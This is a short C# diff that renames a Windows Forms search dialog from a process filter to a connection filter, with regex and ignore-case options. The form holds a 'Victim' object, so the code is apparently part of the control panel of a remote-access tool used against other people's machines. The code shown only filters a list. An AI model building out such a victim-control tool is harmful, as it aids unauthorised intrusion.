@@ -10,26 +10,26 @@ using System.Windows.Forms;
 
 namespace Reception
 {
-    public partial class frmProcessFind : Form
+    public partial class frmConnFind : Form
     {
-        public Form1 f1;
         public Victim v;
+        public Form1 f1;
 
-        public frmProcessFind()
+        public frmConnFind()
         {
             InitializeComponent();
         }
 
         void SetFilter()
         {
-            Proc_F filter = new Proc_F()
+            conn_F f = new conn_F()
             {
                 pattern = textBox1.Text,
                 regex = checkBox1.Checked,
                 ignore_case = checkBox2.Checked,
             };
 
-            f1.proc_Filter(filter, v);
+            f1.conn_Filter(f, v);
         }
 
         void setup()
@@ -37,7 +37,7 @@ namespace Reception
 
         }
 
-        private void frmProcessFind_Load(object sender, EventArgs e)
+        private void frmConnFind_Load(object sender, EventArgs e)
         {
             setup();
         }
